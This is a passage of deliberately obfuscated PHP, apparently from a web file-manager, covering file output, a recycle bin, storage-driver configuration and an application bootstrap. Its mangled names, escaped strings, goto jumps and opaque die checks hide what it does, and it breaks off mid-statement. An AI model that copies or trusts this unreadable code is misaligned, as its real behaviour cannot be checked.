$this->getPathOuter($Œ—¾ÔŒ·); } public function addFileByRemote($¾Âååµ‚, $šÜÄ×ø¸, $çŒ–£À’ = array(), $õ£‡‡¯² = '', $İµÚ¥—ä) { $â¼ÒŒŒ =& $_SERVER[¯µç›È¢]; $Õ³Ä‡ = $this->parse($¾Âååµ‚); $õ£‡‡¯² = empty($õ£‡‡¯²) ? $Õ³Ä‡[$â¼ÒŒŒ[88]] : $õ£‡‡¯²; $…öøïóÏ = $this->model->addFileByRemote($Õ³Ä‡[$â¼ÒŒŒ[405]], $šÜÄ×ø¸, $õ£‡‡¯², $çŒ–£À’, $İµÚ¥—ä); return $this->getPathOuter($…öøïóÏ); } public function uploadLink($¯¢øŸ´², $´Ó§Ÿ›¤ = 0) { $Ú Æ„ãã =& $_SERVER[¯µç›È¢]; $¯ê‚Ûµ¿ = $this->parse($¯¢øŸ´²); $Ïş›ìÂº = _get($GLOBALS[$Ú Æ„ãã[7]], $Ú Æ„ãã[1339]); $°İÅòÆ« = _get($GLOBALS[$Ú Æ„ãã[7]], $Ú Æ„ãã[1340]); $¯¢øŸ´² = Model($Ú Æ„ãã[611])->createFileName($¯ê‚Ûµ¿[$Ú Æ„ãã[88]], $Ïş›ìÂº, $°İÅòÆ«); return IO::uploadLink($¯¢øŸ´², $´Ó§Ÿ›¤); } public function fileNameAuto($Š®â¿Ã®, $ÃÂÄôü, $ºÉ½„òî = REPEAT_REPLACE, $Êƒ®®×¼ = false) { return $this->model->fileNameAuto($Š®â¿Ã®, $ÃÂÄôü, $ºÉ½„òî, $Êƒ®®×¼); } public function fileNameExist($Ø­É°¯, $ÖÖ¯¦é) { return $this->model->fileNameExist($Ø­É°¯, $ÖÖ¯¦é); } protected function _fileOut($ÙÇ–§”„, $ÎæĞåšÀ = false, $ÈßìÌïÉ = false, $î¡Ø¬îÅ = '', $óÈÛ±ÆÅ = false) { $óÉ¥µÀ… =& $_SERVER[¯µç›È¢]; $£€°ÅõŠ = $this->model->sourceInfo($ÙÇ–§”„); if ($£€°ÅõŠ[$óÉ¥µÀ…[416]] == $óÉ¥µÀ…[99]) { header($óÉ¥µÀ…[1341]); die; } $”ëâïØˆ = $this->model->fileInfoGet($ÙÇ–§”„); $î¡Ø¬îÅ = $”ëâïØˆ[$óÉ¥µÀ…[183]] ? $”ëâïØˆ[$óÉ¥µÀ…[183]] : $î¡Ø¬îÅ; $–ÊÒ§Ÿî = isset($GLOBALS[$óÉ¥µÀ…[1342]]) ? $GLOBALS[$óÉ¥µÀ…[1342]] : $£€°ÅõŠ[$óÉ¥µÀ…[32]]; if ($óÈÛ±ÆÅ) { return IO::fileOutServer($”ëâïØˆ[$óÉ¥µÀ…[88]], $ÎæĞåšÀ, $–ÊÒ§Ÿî, $î¡Ø¬îÅ); } IO::fileOut($”ëâïØˆ[$óÉ¥µÀ…[88]], $ÎæĞåšÀ, $–ÊÒ§Ÿî, $î¡Ø¬îÅ); } public function fileOut($éó–ë¢Â, $ÀıëË´² = false, $ğìâ•  = false, $Ó¬¢š¿½ = '') { $this->_fileOut($éó–ë¢Â, $ÀıëË´², $ğìâ• , $Ó¬¢š¿½); } public function fileOutServer($±˜‚õ™å, $ÉÍ€¿‘ = false, $£úÀËÒ¶ = false, $â×¬ŠÁˆ = '') { $this->_fileOut($±˜‚õ™å, $ÉÍ€¿‘, $£úÀËÒ¶, $â×¬ŠÁˆ, !0); } protected function _fileOutImage($§óÆÏñõ, $İùóÆ„ = 250) { $Ü‡¯ó§‹ =& $_SERVER[¯µç›È¢]; $ÜÑ½ÆÖ¬ = $this->model->pathInfo($§óÆÏñõ); if ($ÜÑ½ÆÖ¬[$Ü‡¯ó§‹[416]] == $Ü‡¯ó§‹[99]) { show_json($Ü‡¯ó§‹[1343] . $§óÆÏñõ, !1); } $†·€°™Â = $this->model->fileInfoGet($§óÆÏñõ); $†·€°™Â[$Ü‡¯ó§‹[32]] = $ÜÑ½ÆÖ¬[$Ü‡¯ó§‹[32]]; $†·€°™Â[$Ü‡¯ó§‹[176]] = $ÜÑ½ÆÖ¬[$Ü‡¯ó§‹[176]]; $GLOBALS[$Ü‡¯ó§‹[1342]] = $†·€°™Â[$Ü‡¯ó§‹[32]]; $GLOBALS[$Ü‡¯ó§‹[175]] = $†·€°™Â; IO::fileOutImage($†·€°™Â[$Ü‡¯ó§‹[88]], $İùóÆ„); } public function fileOutImage($†ä›ÌÒğ, $ÂÖ¡‡¡Ë = 250) { $this->_fileOutImage($†ä›ÌÒğ, $ÂÖ¡‡¡Ë); } public function fileOutImageServer($¦»Â÷ó, $ŞÖôÙÏ¬ = 250) { $this->_fileOutImage($¦»Â÷ó, $ŞÖôÙÏ¬); } public function link($Æ¨†µ…ç, $ëã…ç¬Î = '') { $•À×·Ÿ = $this->model->fileInfoGet($Æ¨†µ…ç); return IO::link($•À×·Ÿ[$_SERVER[¯µç›È¢][88]], $ëã…ç¬Î); } protected function parse($Ö¯˜˜Ø®) { $Á´ğıï =& $_SERVER[¯µç›È¢]; if (strstr($Ö¯˜˜Ø®, $Á´ğıï[8]) === !1) { return array($Á´ğıï[425] => intval($Ö¯˜˜Ø®), $Á´ğıï[88] => $Á´ğıï[12], $Á´ğıï[1338] => array()); } $•‘¶æœª = explode($Á´ğıï[8], trim($Ö¯˜˜Ø®, $Á´ğıï[8])); if (count($•‘¶æœª) < 2) { show_tips(clear_html($Ö¯˜˜Ø®) . $Á´ğıï[1344]); } return array($Á´ğıï[425] => intval($•‘¶æœª[0]), $Á´ğıï[88] => $•‘¶æœª[1], $Á´ğıï[1338] => array_slice($•‘¶æœª, 1)); } } goto b¶¨¾­”ê«; eğÉ›áŒˆ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\x63\145\x5f\x72\145\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\x66\165\156\143\164\151\157\156")); public function listData($ˆ¯£İÊ† = false) { $Ï³Ÿœ =& $_SERVER[¯µç›È¢]; $ˆ¯£İÊ† = $ˆ¯£İÊ† ? $ˆ¯£İÊ† : USER_ID; $ùğ¤æ×ñ = $this->where(array($Ï³Ÿœ[1657] => $ˆ¯£İÊ†))->select(); return array_to_keyvalue($ùğ¤æ×ñ, $Ï³Ÿœ[12], $Ï³Ÿœ[408]); } public function moveToRecycle($²Ù¬Ûš™) { $›ÎÆ© =& $_SERVER[¯µç›È¢]; $³ùÌôø¸ = Model($›ÎÆ©[1337]); $Ìúø© = $³ùÌôø¸->sourceInfo($²Ù¬Ûš™); if (!$Ìúø© || $Ìúø©[$›ÎÆ©[436]] == $›ÎÆ©[99]) { return; } $Ö–á¶Õ€ = array($›ÎÆ©[423] => $²Ù¬Ûš™, $›ÎÆ©[1657] => USER_ID, $›ÎÆ©[588] => $Ìúø©[$›ÎÆ©[417]], $›ÎÆ©[589] => $Ìúø©[$›ÎÆ©[510]], $›ÎÆ©[592] => $Ìúø©[$›ÎÆ©[526]]); $this->add($Ö–á¶Õ€); $this->recycleMove($²Ù¬Ûš™, 1); if ($Ìúø©[$›ÎÆ©[416]] == $›ÎÆ©[99]) { $³’Õ±Ïé = array($›ÎÆ©[592] => array($›ÎÆ©[552], $Ìúø©[$›ÎÆ©[526]] . $²Ù¬Ûš™ . $›ÎÆ©[553])); $³ùÌôø¸->where($³’Õ±Ïé)->setField($›ÎÆ©[436], 1); } } public function clear() { $this->remove(!1); } public function remove($õ”ˆ¸õ = false, $·­ÓÃ·’ = false) { $¹É’—êõ =& $_SERVER[¯µç›È¢]; $·­ÓÃ·’ = $·­ÓÃ·’ ? $·­ÓÃ·’ : USER_ID; $å¨²¡Îİ = Model($¹É’—êõ[1337]); $Şô¨Œ›´ = $this->listData($·­ÓÃ·’); $õ”ˆ¸õ = $õ”ˆ¸õ === !1 ? !1 : $õ”ˆ¸õ; $™÷©Ñä§ = array(); foreach ($Şô¨Œ›´ as $Ğºóš­) { if ($õ”ˆ¸õ != !1 && !in_array($Ğºóš­, $õ”ˆ¸õ)) { continue; } $ë¡ëÍ¶ = $å¨²¡Îİ->sourceInfo($Ğºóš­); $å¨²¡Îİ->remove($Ğºóš­, !1); $úÌù—ëö = $ë¡ëÍ¶[$¹É’—êõ[417]] . $¹É’—êõ[11] . $ë¡ëÍ¶[$¹É’—êõ[510]]; $™÷©Ñä§[$úÌù—ëö] = array($¹É’—êõ[588] => $ë¡ëÍ¶[$¹É’—êõ[417]], $¹É’—êõ[510] => $ë¡ëÍ¶[$¹É’—êõ[510]]); $this->where(array($¹É’—êõ[408] => $Ğºóš­))->delete(); } foreach ($™÷©Ñä§ as $ìÑÒˆÊ) { $å¨²¡Îİ->targetSpaceUpdate($ìÑÒˆÊ[$¹É’—êõ[417]], $ìÑÒˆÊ[$¹É’—êõ[510]]); } } public function restore($†ßıŞ‰ı = false) { $ş˜Å—Èº = $this->listData(); $this->_restoreSource($ş˜Å—Èº, $†ßıŞ‰ı); } public function removeUserAll($²´¦àú«) { $this->remove(!1, $²´¦àú«); } private function _restoreSource($ŠŠåşô, $è†¬âô§) { $ò«¹ÇÅ™ =& $_SERVER[¯µç›È¢]; $­øœúŞ = Model($ò«¹ÇÅ™[1337]); $è†¬âô§ = $è†¬âô§ == !1 ? !1 : $è†¬âô§; if (!$ŠŠåşô) { return !0; } $”ñº£ÊÔ = array(); foreach ($ŠŠåşô as $™‚Ÿ»È) { if ($è†¬âô§ != !1 && !in_array($™‚Ÿ»È, $è†¬âô§)) { continue; } $©ê÷“ó· = $­øœúŞ->sourceInfo($™‚Ÿ»È); $ÖÈÄÂ€ = $­øœúŞ->sourceInfo($©ê÷“ó·[$ò«¹ÇÅ™[503]]); if ($ÖÈÄÂ€[$ò«¹ÇÅ™[436]] == $ò«¹ÇÅ™[99]) { continue; } $­øœúŞ->lockMoveStart($™‚Ÿ»È); $this->recycleMove($™‚Ÿ»È, 0); if ($©ê÷“ó·[$ò«¹ÇÅ™[416]] == $ò«¹ÇÅ™[99]) { $¶ä²ÁúÇ = array($ò«¹ÇÅ™[592] => array($ò«¹ÇÅ™[552], $©ê÷“ó·[$ò«¹ÇÅ™[526]] . $™‚Ÿ»È . $ò«¹ÇÅ™[553])); $­øœúŞ->where($¶ä²ÁúÇ)->setField($ò«¹ÇÅ™[436], 0); $this->restoreFolderChildren($™‚Ÿ»È, $ŠŠåşô); } $this->where(array($ò«¹ÇÅ™[408] => $™‚Ÿ»È))->delete(); $­øœúŞ->folderSizeReset($©ê÷“ó·[$ò«¹ÇÅ™[503]]); $”ñº£ÊÔ[] = $©ê÷“ó·[$ò«¹ÇÅ™[503]]; if ($©ê÷“ó·[$ò«¹ÇÅ™[416]] == $ò«¹ÇÅ™[99]) { $”ñº£ÊÔ[] = $™‚Ÿ»È; } $­øœúŞ->lockMoveEnd($™‚Ÿ»È); } $­øœúŞ->updateModifyTime($”ñº£ÊÔ); } private function restoreFolderChildren($‹ãø¯, $ÑŒİåà) { $óˆ´­Ì¼ =& $_SERVER[¯µç›È¢]; $î˜«î¥£ = Model($óˆ´­Ì¼[1337]); $à½˜Ê³™ = array($óˆ´­Ì¼[408] => array($óˆ´­Ì¼[7], array())); foreach ($ÑŒİåà as $İì½ä¡¢) { if ($İì½ä¡¢ == $‹ãø¯) { continue; } if (!$î˜«î¥£->isParentOf($‹ãø¯, $İì½ä¡¢)) { continue; } $Ô¢ˆ£¼Ô = $î˜«î¥£->sourceInfo($İì½ä¡¢); if ($Ô¢ˆ£¼Ô[$óˆ´­Ì¼[416]] == $óˆ´­Ì¼[99]) { $à½˜Ê³™[] = array($óˆ´­Ì¼[592] => array($óˆ´­Ì¼[552], $Ô¢ˆ£¼Ô[$óˆ´­Ì¼[526]] . $İì½ä¡¢ . $óˆ´­Ì¼[553])); } else { $à½˜Ê³™[$óˆ´­Ì¼[408]][1][] = $İì½ä¡¢; } } if (!$à½˜Ê³™[$óˆ´­Ì¼[408]][1]) { unset($à½˜Ê³™[$óˆ´­Ì¼[408]]); } if (!$à½˜Ê³™) { return; } $à½˜Ê³™[$óˆ´­Ì¼[408]][1] = array_unique($à½˜Ê³™[$óˆ´­Ì¼[408]][1]); $à½˜Ê³™[$óˆ´­Ì¼[1012]] = $óˆ´­Ì¼[1931]; $î˜«î¥£->where($à½˜Ê³™)->setField($óˆ´­Ì¼[436], 1); } private function recycleMove($œÚÙÊÔü, $Ü ë–ÍÚ = 1) { $¥¹½óÕ¯ =& $_SERVER[¯µç›È¢]; $¬Èø‡®Ù = Model($¥¹½óÕ¯[1337]); $ƒØ‡˜º¹ = Model($¥¹½óÕ¯[2135]); $§õºŠì = array($¥¹½óÕ¯[408] => $œÚÙÊÔü); if ($Ü ë–ÍÚ) { $¬Èø‡®Ù->where($§õºŠì)->setField($¥¹½óÕ¯[436], 1); $ƒØ‡˜º¹->eventRecycle($œÚÙÊÔü, $¥¹½óÕ¯[2136]); } else { $€²Àë = $¬Èø‡®Ù->where($§õºŠì)->find(); $î Îâåè = $€²Àë[$¥¹½óÕ¯[416]] == $¥¹½óÕ¯[99]; $¸Ã¢“ÇØ = $¬Èø‡®Ù->fileNameAuto($€²Àë[$¥¹½óÕ¯[503]], $€²Àë[$¥¹½óÕ¯[32]], REPEAT_RENAME_FOLDER, $î Îâåè); if ($¸Ã¢“ÇØ != $€²Àë[$¥¹½óÕ¯[32]]) { $¬Èø‡®Ù->rename($œÚÙÊÔü, $¸Ã¢“ÇØ); } $¬Èø‡®Ù->where($§õºŠì)->setField($¥¹½óÕ¯[436], 0); $ƒØ‡˜º¹->eventRecycle($œÚÙÊÔü, $¥¹½óÕ¯[2137]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x73\157\165\x72\x63\145\x53\145\x63\162\145\x74\114\x69\x73\x74"; public $field = array("\163\157\165\x72\143\x65\111\104", "\164\x79\x70\145\x49\104", "\143\x72\x65\x61\x74\145\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x73\164\157\162\x61\x67\145\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\x7a\145\115\x61\170", "\x73\171\163\164\x65\x6d", "\x64\x65\x66\x61\x75\x6c\x74", "\x64\x72\x69\166\145\x72", "\x63\x6f\x6e\146\x69\147"); public function listData($šû²¨Ê¹ = false, $ÊÀ½ê¥ = "\x6d\157\144\151\x66\x79\124\x69\x6d\x65", $©âôºşû = false) { $¾¯ùĞóé =& $_SERVER[¯µç›È¢]; $¨Ä‡»Ú = parent::listData($šû²¨Ê¹, $ÊÀ½ê¥, $©âôºşû); if ($šû²¨Ê¹) { return $¨Ä‡»Ú; } $ÃÄ«Ûç = $this->ioSizeUseGet(array_to_keyvalue($¨Ä‡»Ú, $¾¯ùĞóé[12], $¾¯ùĞóé[405])); foreach ($¨Ä‡»Ú as $‡ğÈÇ¢ş => $à¥åÆö€) { unset($¨Ä‡»Ú[$‡ğÈÇ¢ş][$¾¯ùĞóé[6]]); $¨Ä‡»Ú[$‡ğÈÇ¢ş][$¾¯ùĞóé[1823]] = isset($ÃÄ«Ûç[$à¥åÆö€[$¾¯ùĞóé[405]]]) ? $ÃÄ«Ûç[$à¥åÆö€[$¾¯ùĞóé[405]]] : 0; } return $¨Ä‡»Ú; } public function ioSizeUseGet($·È³ôˆİ) { $µí³óÕ¼ =& $_SERVER[¯µç›È¢]; if (!$·È³ôˆİ) { return array(); } $™£§¨¨ = $µí³óÕ¼[2138] . implode($µí³óÕ¼[50], $·È³ôˆİ); $Šë”ªåø = Cache::get($™£§¨¨); if ($Šë”ªåø) { return $Šë”ªåø; } $×¼ĞˆËÁ = array($µí³óÕ¼[834] => $µí³óÕ¼[405], $µí³óÕ¼[2139] => $µí³óÕ¼[90]); $ãÊƒÏæ³ = array($µí³óÕ¼[834] => array($µí³óÕ¼[7], $·È³ôˆİ)); $Šë”ªåø = Model($µí³óÕ¼[806])->field($×¼ĞˆËÁ)->where($ãÊƒÏæ³)->group($µí³óÕ¼[834])->select(); $Šë”ªåø = array_to_keyvalue($Šë”ªåø, $µí³óÕ¼[405], $µí³óÕ¼[90]); Cache::set($™£§¨¨, $Šë”ªåø, 600); return $Šë”ªåø; } public function getConfig($µÛ´¯ïÓ) { $ˆ€áà»ä = parent::listData($µÛ´¯ïÓ); return json_decode($ˆ€áà»ä[$_SERVER[¯µç›È¢][6]], !0); } public function update($´»ßšÕ, $’ğ‰ú€Ç) { $ôÏÇöş¼ =& $_SERVER[¯µç›È¢]; $ğ¿·š÷½ = $’ğ‰ú€Ç[$ôÏÇöş¼[32]]; $óïç¬¤õ = array_to_keyvalue(parent::listData(), $ôÏÇöş¼[32]); if (isset($óïç¬¤õ[$ğ¿·š÷½]) && $óïç¬¤õ[$ğ¿·š÷½][$ôÏÇöş¼[405]] != $´»ßšÕ) { return !1; } if (isset($’ğ‰ú€Ç[$ôÏÇöş¼[2140]]) && $’ğ‰ú€Ç[$ôÏÇöş¼[2140]] == $ôÏÇöş¼[99]) { $this->checkConfig($’ğ‰ú€Ç); } unset($’ğ‰ú€Ç[$ôÏÇöş¼[2140]]); $ÇÎÔÖˆŞ = parent::update($´»ßšÕ, $’ğ‰ú€Ç); if ($ÇÎÔÖˆŞ && $’ğ‰ú€Ç[$ôÏÇöş¼[37]]) { $åÆ Ó–Ë = 0; foreach ($óïç¬¤õ as $ùÍ²œşÇ) { if ($ùÍ²œşÇ[$ôÏÇöş¼[37]] && $ùÍ²œşÇ[$ôÏÇöş¼[405]] != $´»ßšÕ) { $åÆ Ó–Ë = $ùÍ²œşÇ[$ôÏÇöş¼[405]]; parent::update($ùÍ²œşÇ[$ôÏÇöş¼[405]], array($ôÏÇöş¼[37] => 0)); } } $this->updateBackup($´»ßšÕ, $åÆ Ó–Ë); } return $ÇÎÔÖˆŞ; } public function add($«Ó¸´úí) { $Â‰Ü«Íè =& $_SERVER[¯µç›È¢]; $íûœ¶Ë = array_to_keyvalue(parent::listData(), $Â‰Ü«Íè[32]); if (isset($íûœ¶Ë[$«Ó¸´úí[$Â‰Ü«Íè[32]]])) { return !1; } $this->checkConfig($«Ó¸´úí); $ıÏ ÖŒÌ = parent::insert($«Ó¸´úí); if ($ıÏ ÖŒÌ && $«Ó¸´úí[$Â‰Ü«Íè[37]]) { foreach ($íûœ¶Ë as $ç®åÎ©Ø) { if ($ç®åÎ©Ø[$Â‰Ü«Íè[37]]) { parent::update($ç®åÎ©Ø[$Â‰Ü«Íè[405]], array($Â‰Ü«Íè[37] => 0)); } } } return $ıÏ ÖŒÌ; } public function updateBackup($›Ò¼¨ûØ, $òŒó¢«Ó) { $ëáÚ’· =& $_SERVER[¯µç›È¢]; if (!$òŒó¢«Ó) { return; } $úå¡é‹ = Model($ëáÚ’·[766])->config(); if ($úå¡é‹[$ëáÚ’·[1636]] != $ëáÚ’·[99] || $úå¡é‹[$ëáÚ’·[769]] != $òŒó¢«Ó) { return; } $”İéšœƒ = Model($ëáÚ’·[787])->get($ëáÚ’·[797]); $”İéšœƒ = json_decode($”İéšœƒ, !0); if (!$”İéšœƒ) { return; } $”İéšœƒ[$ëáÚ’·[769]] = $›Ò¼¨ûØ; Model($ëáÚ’·[787])->set(array($ëáÚ’·[797] => $”İéšœƒ)); } public function checkConfig(&$¯Ô¼Ü¼, $Üîúìøœ = false) { $Ø„ÂŠÉÕ =& $_SERVER[¯µç›È¢]; $±ëÎ¡° = strtolower($¯Ô¼Ü¼[$Ø„ÂŠÉÕ[106]]); $ñĞº§—Œ = json_decode($¯Ô¼Ü¼[$Ø„ÂŠÉÕ[6]], !0); foreach ($ñĞº§—Œ as $ûÆîñ»ò => $â¦¿üÄ) { $ñĞº§—Œ[$ûÆîñ»ò] = trim($â¦¿üÄ); } $ñĞº§—Œ[$Ø„ÂŠÉÕ[2141]] = rand_string(6); $°—Ñ¬‘§ = $GLOBALS[$Ø„ÂŠÉÕ[6]][$Ø„ÂŠÉÕ[100]][$Ø„ÂŠÉÕ[843]]; $øÊÌˆâƒ = isset($°—Ñ¬‘§[$±ëÎ¡°]) ? $°—Ñ¬‘§[$±ëÎ¡°] : ucfirst($±ëÎ¡°); $˜Ç¾Šµ– = $Ø„ÂŠÉÕ[84] . $øÊÌˆâƒ; if (!$øÊÌˆâƒ || !class_exists($˜Ç¾Šµ–)) { if ($Üîúìøœ) { return LNG($Ø„ÂŠÉÕ[2142]); } write_log(array($Ø„ÂŠÉÕ[2143], $¯Ô¼Ü¼, get_caller_info()), $Ø„ÂŠÉÕ[2144]); show_json(LNG($Ø„ÂŠÉÕ[2142]), !1, $¯Ô¼Ü¼); } $½¦‚Ú×· = new $˜Ç¾Šµ–($ñĞº§—Œ); if (in_array($±ëÎ¡°, $½¦‚Ú×·->objectDriver)) { if (!$½¦‚Ú×·->isBucketCors() && !$½¦‚Ú×·->setBucketCors()) { $Ñí¨¥É² = LNG($Ø„ÂŠÉÕ[2145]); $Ñí¨¥É² .= $Ø„ÂŠÉÕ[2146] . LNG($Ø„ÂŠÉÕ[2147]); if ($Üîúìøœ) { return $Ñí¨¥É²; } show_json($Ñí¨¥É², !1); } } $×ú§•°Ç = rtrim($ñĞº§—Œ[$Ø„ÂŠÉÕ[1191]], $Ø„ÂŠÉÕ[8]) . $Ø„ÂŠÉÕ[8]; $Ò§Óõúõ = $½¦‚Ú×·->getPath($×ú§•°Ç . $Ø„ÂŠÉÕ[1253]); if (!$½¦‚Ú×·->mkfile($Ò§Óõúõ)) { if ($Üîúìøœ) { return LNG($Ø„ÂŠÉÕ[2145]); } show_json(LNG($Ø„ÂŠÉÕ[2145]), !1); } $ñĞº§—Œ[$Ø„ÂŠÉÕ[1191]] = $×ú§•°Ç; $¯Ô¼Ü¼[$Ø„ÂŠÉÕ[6]] = json_encode($ñĞº§—Œ); $¯Ô¼Ü¼[$Ø„ÂŠÉÕ[106]] = $øÊÌˆâƒ; return !0; } public function driverListSystem() { $ûÛ´®ÇÚ =& $_SERVER[¯µç›È¢]; $–¿Ú¡şõ = parent::listData(); $¡ş–±®ˆ = array(); foreach ($–¿Ú¡şõ as $ş¡›÷Ä») { unset($ş¡›÷Ä»[$ûÛ´®ÇÚ[207]], $ş¡›÷Ä»[$ûÛ´®ÇÚ[96]]); $ş¡›÷Ä»[$ûÛ´®ÇÚ[6]] = json_decode($ş¡›÷Ä»[$ûÛ´®ÇÚ[6]], !0); $¡ş–±®ˆ[] = $ş¡›÷Ä»; } return $¡ş–±®ˆ; } public function defaultDriver() { $¹€ÍÙÄâ =& $_SERVER[¯µç›È¢]; $öÄèî„« = parent::listData(); $šƒŠúô = array_filter_by_field($öÄèî„«, $¹€ÍÙÄâ[37], 1); $šƒŠúô = $šƒŠúô[0]; if ($šƒŠúô) { $šƒŠúô[$¹€ÍÙÄâ[6]] = json_decode($šƒŠúô[$¹€ÍÙÄâ[6]], !0); } return $šƒŠúô; } public function driverInfo($…Áú§ö») { $§·áşõ¤ =& $_SERVER[¯µç›È¢]; $µúŒ£»¯ = array_to_keyvalue(parent::listData(), $§·áşõ¤[405]); if (!isset($µúŒ£»¯[$…Áú§ö»])) { return !1; } $”¶å§±× = $µúŒ£»¯[$…Áú§ö»]; $”¶å§±×[$§·áşõ¤[6]] = json_decode($”¶å§±×[$§·áşõ¤[6]], !0); return $”¶å§±×; } public function remove($Äõù‰ûë) { $this->removeShareItems($Äõù‰ûë); return parent::remove($Äõù‰ûë); } public function removeWithFile($¬Æ“ÙÑ, $òéÓÍ) { $Ì¶äªˆÉ =& $_SERVER[¯µç›È¢]; $ï¯»­ãî = array($Ì¶äªˆÉ[834] => $¬Æ“ÙÑ); $ÄØÄİŸ‹ = Model($Ì¶äªˆÉ[475])->where($ï¯»­ãî)->count(); $ˆ´¤êµ™ = Model($Ì¶äªˆÉ[475])->where($ï¯»­ãî)->sum($Ì¶äªˆÉ[90]); $âŞçËºä = $òéÓÍ . $Ì¶äªˆÉ[2148] . $¬Æ“ÙÑ; $œØ‚¸ú’ = LNG($òéÓÍ == $Ì¶äªˆÉ[559] ? $Ì¶äªˆÉ[2149] : $Ì¶äªˆÉ[2150]); $ß¹Ä«Ï = new TaskFileTransfer($âŞçËºä, $Ì¶äªˆÉ[2144], $ÄØÄİŸ‹, $œØ‚¸ú’ . "\50{$¬Æ“ÙÑ}\51"); $ß¹Ä«Ï->task[$Ì¶äªˆÉ[780]] = (double) $ˆ´¤êµ™; $÷ß´ãü´ = KodIO::defaultDriver(); $Üê“şÆĞ = $÷ß´ãü´[$Ì¶äªˆÉ[405]]; $Ù‰ŞŞ¤Ù = "\x7b\151\x6f\72{$Üê“şÆĞ}\175\57"; $”şÈµÙß = !0; $ÒÜöÃ˜Ã = array(); $¬øÑş‡‚ = Model($Ì¶äªˆÉ[206])->where($ï¯»­ãî)->field($Ì¶äªˆÉ[2151])->select(); foreach ($¬øÑş‡‚ as $·ŞÌ£¹¿) { $Å†ßÍì‘ = $·ŞÌ£¹¿[$Ì¶äªˆÉ[88]]; $¨ëÆªÑĞ = $Ù‰ŞŞ¤Ù . str_replace("\x7b\x69\x6f\72{$¬Æ“ÙÑ}\x7d\57", $Ì¶äªˆÉ[12], $Å†ßÍì‘); if (!IO::exist($Å†ßÍì‘)) { $ÒÜöÃ˜Ã[] = $·ŞÌ£¹¿[$Ì¶äªˆÉ[472]]; $ß¹Ä«Ï->updateFileEnd($·ŞÌ£¹¿[$Ì¶äªˆÉ[32]], $·ŞÌ£¹¿[$Ì¶äªˆÉ[90]]); continue; } if (IO::exist($¨ëÆªÑĞ)) { $ß¹Ä«Ï->updateFileEnd($·ŞÌ£¹¿[$Ì¶äªˆÉ[32]], $·ŞÌ£¹¿[$Ì¶äªˆÉ[90]]); continue; } if (!IO::move($Å†ßÍì‘, get_path_father($¨ëÆªÑĞ))) { $”şÈµÙß = !1; break; } $ï¯»­ãî = array($Ì¶äªˆÉ[472] => $·ŞÌ£¹¿[$Ì¶äªˆÉ[472]]); $¹àá•¾« = array($Ì¶äªˆÉ[834] => $Üê“şÆĞ, $Ì¶äªˆÉ[88] => $¨ëÆªÑĞ); Model($Ì¶äªˆÉ[206])->where($ï¯»­ãî)->save($¹àá•¾«); } $this->removeByFileID($ÒÜöÃ˜Ã); if (!$”şÈµÙß) { $ß¹Ä«Ï->stop($âŞçËºä); return !1; } $ß¹Ä«Ï->end(); if ($òéÓÍ == $Ì¶äªˆÉ[1803]) { $this->remove($¬Æ“ÙÑ); } } public function progress($Ù¤ãùîñ, $¥ô“È›) { return Task::get($¥ô“È› . $_SERVER[¯µç›È¢][2148] . $Ù¤ãùîñ); } private function removeByFileID($½æáñ  = array()) { $­«¯‰Æ€ =& $_SERVER[¯µç›È¢]; if (empty($½æáñ )) { return; } $À¸ùğÛÕ = array($­«¯‰Æ€[472] => array($­«¯‰Æ€[7], $½æáñ )); $¥İ¿ÖíÎ = Model($­«¯‰Æ€[1337])->where($À¸ùğÛÕ)->field($­«¯‰Æ€[408])->select(); if (!$¥İ¿ÖíÎ) { return; } $¥İ¿ÖíÎ = array_to_keyvalue($¥İ¿ÖíÎ, $­«¯‰Æ€[12], $­«¯‰Æ€[408]); foreach ($¥İ¿ÖíÎ as $ŒúåöË) { Model($­«¯‰Æ€[422])->removeNow($ŒúåöË, !1); } } private function removeShareItems($Ñ¥ı¬‡‰) { $‡æ‘˜‡ú =& $_SERVER[¯µç›È¢]; $¨ÀÛ´ = "\x7b\151\x6f\x3a{$Ñ¥ı¬‡‰}\175\57"; $­«ŞÖ¨á = array($‡æ‘˜‡ú[408] => 0, $‡æ‘˜‡ú[1186] => array($‡æ‘˜‡ú[391], "{$¨ÀÛ´}\x25")); $¢£…ÑÈË = Model($‡æ‘˜‡ú[1814])->where($­«ŞÖ¨á)->field($‡æ‘˜‡ú[493])->select(); if (empty($¢£…ÑÈË)) { return; } $îÌå”ôø = array_to_keyvalue($¢£…ÑÈË, $‡æ‘˜‡ú[12], $‡æ‘˜‡ú[493]); Model($‡æ‘˜‡ú[603])->remove($îÌå”ôø); } } goto Fù„ˆ·²íé; fã£ÔÃƒâ: class Application { private $defaultModule = "\151\x6e\x64\x65\170"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($Ù³—ñ˜’) { $©”Ÿ·Ï =& $_SERVER[¯µç›È¢]; $ñ»³éÂ× =& $_SERVER[¥Ô°é•­]; $äúˆæ‹Ş = explode($ñ»³éÂ×[0], trim($Ù³—ñ˜’, $ñ»³éÂ×[0])); $this->defaultModule = $äúˆæ‹Ş[0] ? $äúˆæ‹Ş[0] : $this->defaultModule; $åñŸıï = $©”Ÿ·Ï[619]; $this->defaultController = $äúˆæ‹Ş[1] ? $äúˆæ‹Ş[1] : $this->defaultController; $•òĞƒª = $©”Ÿ·Ï[620]; if (!$•òĞƒª) { return; } $this->defaultAction = $äúˆæ‹Ş[2] ? $äúˆæ‹Ş[2] : $this->defaultAction; $²òÑêœ© = $©”Ÿ·Ï[621]; if (strlen($²òÑêœ©) < $©”Ÿ·Ï[622]) { return; } $this->nxejedb5adba($ñ»³éÂ×[1], array($this, $ñ»³éÂ×[2])); $ÅÌøêÏ¼ = $©”Ÿ·Ï[623]; } public function appRun($“ÏáÄØ) { $åâ¦À¾ =& $_SERVER[¯µç›È¢]; $Á¬ã‹«ú =& $_SERVER[¥Ô°é•­]; $±·¦çÇ = explode($Á¬ã‹«ú[0], $“ÏáÄØ); $òïº—Ü = $åâ¦À¾[624]; if (strlen($òïº—Ü) < $åâ¦À¾[67]) { die; } $§¶‰Í¯ = 